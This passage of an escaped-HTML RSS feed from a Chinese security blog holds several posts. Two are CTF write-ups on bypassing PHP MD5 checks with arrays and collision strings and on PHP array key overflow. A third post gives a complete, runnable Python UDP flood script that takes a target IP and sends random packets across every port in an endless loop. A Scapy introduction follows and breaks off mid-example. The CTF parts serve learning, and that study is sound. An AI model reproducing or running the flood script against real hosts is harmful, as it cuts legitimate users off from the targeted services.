&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;flag&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>解析&lt;/strong>&lt;/p>
&lt;p>在 php 中，&lt;code>===&lt;/code> 代表着强比较，不仅仅会比较值，还会比较类型。因此这里不能在使用上面的方式进行绕过了。&lt;/p>
&lt;p>要绕过此处的比较，需要向 md5() 函数中传入数组，md5() 函数中如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面&lt;code>null=null&lt;/code>为 True 绕过。&lt;/p>
&lt;p>&lt;strong>payload：&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;h2 id="md5-碰撞">MD5 碰撞
&lt;/h2>&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$flag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>解析&lt;/strong>&lt;/p>
&lt;p>由于此处将得到的值强制转换为了字符串，因此使用数组的方式无法进行绕过。&lt;/p>
&lt;p>此处只能利用 MD5 值计算方法本身的缺陷 —— 存在散列冲突，必然会有两个内容一样但是 MD5 值一样的序列。&lt;/p>
&lt;p>&lt;strong>内容不同值一样的序列：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$s1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$s2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$s3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>如果需要对特定值构造，那么也可以使用下面这个神器快速构建字符串：&lt;/strong>&lt;/p>
&lt;p>内容参加：&lt;a class="link" href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener"
>如何用不同的数值构建一样的MD5 - 第二届强网杯 MD5碰撞 writeup - 先知社区 (aliyun.com)&lt;/a>&lt;/p></description></item><item><title>php 数组溢出</title><link>https://wlynxg.github.io/blog/p/php-%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/php-%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA/</guid><description>&lt;h1 id="php-数组溢出">php 数组溢出
&lt;/h1>&lt;h2 id="题目">题目
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$array&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nv">$c&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$array&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;nonono&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">require_once&lt;/span> &lt;span class="s1">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nv">$flag&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="解析">解析
&lt;/h2>&lt;p>本题重点在此行：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$array&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>此语句正常赋值时，返回结果一定是为 1 的，要想跳出这个判断语句，必须让它赋值出问题。&lt;/p>
&lt;p>查阅资料后发现：&lt;/p>
&lt;blockquote>
&lt;p>作为PHP最重要的数据类型HashTable其key值是有一定的范围的，如果设置的key值过大就会出现溢出的问题，临界点是&lt;code>9223372036854775807&lt;/code>这个数字。&lt;/p>
&lt;p>——参考来源：&lt;a class="link" href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/" target="_blank" rel="noopener"
>PHP数组的key溢出问题 | oohcode | $\bigodot\bigodot^H \rightarrow CODE$ (two.github.io)&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>解决此题只需要给 $c 赋值 &lt;code>9223372036854775806&lt;/code>，那么就能跳出语句判断。&lt;/p></description></item><item><title>Python 实现 DoS 攻击 —— UDP洪水攻击</title><link>https://wlynxg.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-dos-%E6%94%BB%E5%87%BB-udp%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-dos-%E6%94%BB%E5%87%BB-udp%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</guid><description>&lt;h1 id="python-实现-dos-攻击--udp洪水攻击">Python 实现 DoS 攻击 —— UDP洪水攻击
&lt;/h1>&lt;h2 id="dos-攻击">DoS 攻击
&lt;/h2>&lt;blockquote>
&lt;p>&lt;strong>拒绝服务攻击&lt;/strong>（denial-of-service attack，简称&lt;strong>DoS攻击&lt;/strong>）亦称&lt;strong>洪水攻击&lt;/strong>，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。&lt;/p>
&lt;p>——维基百科&lt;/p>
&lt;/blockquote>
&lt;h2 id="udp洪水攻击">UDP洪水攻击
&lt;/h2>&lt;blockquote>
&lt;p>&lt;strong>UDP洪水攻击&lt;/strong>（User Datagram Protocol floods）：UDP（用户数据报协议）是一种无连接协议，当数据包通过UDP发送时，所有的数据包在发送和接收时不需要进行握手验证。当大量UDP数据包发送给受害系统时，可能会导致带宽饱和从而使得合法服务无法请求访问受害系统。遭受DDoS UDP洪泛攻击时，UDP数据包的目的端口可能是随机或指定的端口，受害系统将尝试处理接收到的数据包以确定本地运行的服务。如果没有应用程序在目标端口运行，受害系统将对源IP发出ICMP数据包，表明“目标端口不可达”。某些情况下，攻击者会伪造源IP地址以隐藏自己，这样从受害系统返回的数据包不会直接回到僵尸主机，而是被发送到被伪造地址的主机。有时UDP洪泛攻击也可能影响受害系统周围的网络连接，这可能导致受害系统附近的正常系统遇到问题。然而，这取决于网络体系结构和线速。&lt;/p>
&lt;p>——维基百科&lt;/p>
&lt;/blockquote>
&lt;h2 id="代码实现">代码实现
&lt;/h2>&lt;p>为了达到攻击效果，我们需要向网络上的目标主机不断发送UDP请求。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">socket&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">random&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 创建 socket 关键字&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">st&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">socket&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">AF_INET&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SOCK_DGRAM&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 创建随机报文数据&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_urandom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;IP Target :&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;UDP flood attack is about to begin...&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 发送数据&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">st&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">bytes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sent&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">port&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Sent &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2"> packet to &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2"> throught port:&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">port&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">65534&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Scapy 介绍</title><link>https://wlynxg.github.io/blog/p/scapy-%E4%BB%8B%E7%BB%8D/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/scapy-%E4%BB%8B%E7%BB%8D/</guid><description>&lt;h1 id="scapy-介绍">Scapy 介绍
&lt;/h1>&lt;h2 id="简介">简介
&lt;/h2>&lt;blockquote>
&lt;p>**Scapy **是一种用于计算机网络的数据包处理工具，由 Philippe Biondi 用 Python 编写。它可以伪造或解码数据包，通过网络发送它们，捕获它们，并匹配请求和响应。它还可以用于处理扫描、跟踪路由、探测、单元测试、攻击和网络发现等任务。&lt;/p>
&lt;p>Scapy 为 libpcap（Windows 上是 WinPCap/Npcap）提供了一个Python接口，与 Wireshark 提供视图和捕获GUI的方式类似。它可以与许多其他程序接口来提供可视化，包括用于解码数据包的 Wireshark、用于提供图形的GnuPlot、用于可视化的 graphviz 或 VPython 等。&lt;/p>
&lt;p>Scapy自2018年起开始支持Python 3（Scapy 2.4.0+）。&lt;/p>
&lt;p>Kamene是Scapy的一个独立分支。最初，创建它的目的是向 Scapy 添加 Python 3 的支持，并将其命名为scapy3k。自2018年更名为Kamene，继续独立发展。&lt;/p>
&lt;p>——维基百科&lt;/p>
&lt;/blockquote>
&lt;h2 id="scapy-简单使用">Scapy 简单使用
&lt;/h2>&lt;p>Scapy是一个Python程序，使用户能够发送，嗅探，剖析和伪造网络数据包。此功能允许构建可探测，扫描或攻击网络的工具。更多内容可以查看 Scapy 的&lt;a class="link" href="https://scapy.readthedocs.io/en/latest/introduction.html" target="_blank" rel="noopener"
>官方文档&lt;/a>。&lt;/p>
&lt;p>首先我们需要通过 pip 的方式安装 scapy 包：&lt;code>pip install scapy&lt;/code>&lt;/p>
&lt;p>Scapy 不仅仅可以做为 Python 库进行程序的编写，它同时也为我们提供了一种命令行的交互方式，下面我们通过的方式来对 Scapy 进行简单使用：&lt;/p>
&lt;h3 id="构造一个网络包">构造一个网络包
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">scapy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Ether&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">IP&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">TCP&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 使用默认参数构造一个TCP数据包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">show&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 显示包的信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ Ethernet ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">e5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">d3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">d7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="n">c&lt;/span>
